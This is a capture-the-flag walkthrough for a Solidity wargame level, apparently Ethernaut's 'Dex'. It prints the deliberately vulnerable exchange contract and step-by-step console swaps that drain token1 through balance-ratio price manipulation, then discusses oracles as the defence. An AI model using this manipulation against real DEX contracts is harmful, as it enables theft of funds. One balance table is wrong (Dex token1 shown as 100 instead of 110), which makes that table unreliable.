# Dex

## Challenge Description

The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.

You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Quick note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

Things that might help:

-   How is the price of the token calculated?
-   How does the `swap` method work?
-   How do you `approve` a transaction of an ERC20?
-   Theres more than one way to interact with a contract!
-   Remix might help
-   What does "At Address" do?

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

## Challenge Solution Walkthrough

To successfully exploit the challenge and drain all of the funds from the `Dex` contract, follow these steps:

1. Grant approval to the `Dex` contract, allowing it to use all of your tokens. Open the console and execute the following command:

```javascript
> await contract.approve(contract.address, 1000)
```

2. Understand the price calculation for each token swap. The price is determined by the following formula:

```solidity
function getSwapPrice(
    address from,
    address to,
    uint amount
) public view returns (uint) {
    return ((amount * IERC20(to).balanceOf(address(this))) /
        IERC20(from).balanceOf(address(this)));
}
```

3. Initially, both the `Dex` and the player have the following token amounts:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |  100   |  100   |
| `player` |   10   |   10   |

4. Obtain the addresses for `token1` and `token2` from the contract by executing the following commands:

```java
> const token1 = await contract.token1()
> const token2 = await contract.token2()
```

5. Begin the manipulation by swapping 10 tokens of `token1` with `token2` using the following command:

```javascript
> await contract.swap(token1, token2, 10)
```

After this swap, the updated token amounts are as follows:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |  110   |   90   |
| `player` |   0    |   20   |

5. Proceed with swapping 20 tokens of `token2` with `token1`:

```javascript
> await contract.swap(token2, token1, 20)
```

The updated token amounts are now:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |   86   |  110   |
| `player` |   24   |   0    |

7. Perform another swap, exchanging 24 tokens of `token1` with `token2`:

```javascript
> await contract.swap(token1, token2, 24)
```

The updated token amounts become:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |  100   |   80   |
| `player` |   0    |   30   |

8. Continue swapping 30 tokens of `token2` with `token1`:

```javascript
> await contract.swap(token2, token1, 30)
```

After this swap, the updated token amounts are:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |   69   |  110   |
| `player` |   41   |   0    |

9. Perform another swap, exchanging 41 tokens of `token1` with `token2`:

```javascript
> await contract.swap(token1, token2, 41)
```

The updated token amounts are now:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |  110   |   45   |
| `player` |   0    |   65   |

10. Finally, swap the remaining 45 tokens of `token2` with `token1` to complete the draining process:

```javascript
> await contract.swap(token2, token1, 45)
```

After this final swap, the updated token amounts become:

|          | Token1 | Token2 |
| :------: | :----: | :----: |
|  `Dex`   |   0    |   90   |
| `player` |  110   |   20   |

By following these steps, you will successfully drain all of the `token1` funds from the `Dex` contract.

## Challenge Description After Solving

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.

[Oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72?source=friends_link&sk=d921a38466df8a9176ed8dd767d8c77d) are used to get data into and out of smart contracts.

[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model), [upkeep, actions, and maintainance](https://docs.chain.link/docs/kovan-keeper-network-beta), and unlimited customization.

[Uniswap TWAP Oracles](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting the price of Bitcoin in USD from a Chainlink data feed (on the Sepolia testnet):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {
    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Sepolia
     * Aggregator: BTC/USD
     * Address: 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
     */
    constructor() {
        priceFeed = AggregatorV3Interface(
            0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
        );
    }

    /**
     * Returns the latest price.
     */
    function getLatestPrice() public view returns (int) {
        // prettier-ignore
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```

[Try it on Remix](https://remix.ethereum.org/#url=https://docs.chain.link/samples/PriceFeeds/PriceConsumerV3.sol)

Check the Chainlink feed [page](https://data.chain.link/ethereum/mainnet/crypto-usd/btc-usd) to see that the price of Bitcoin is queried from up to 31 different sources.

You can check also, the [list](https://docs.chain.link/data-feeds/price-feeds/addresses/) all Chainlink price feeds addresses.
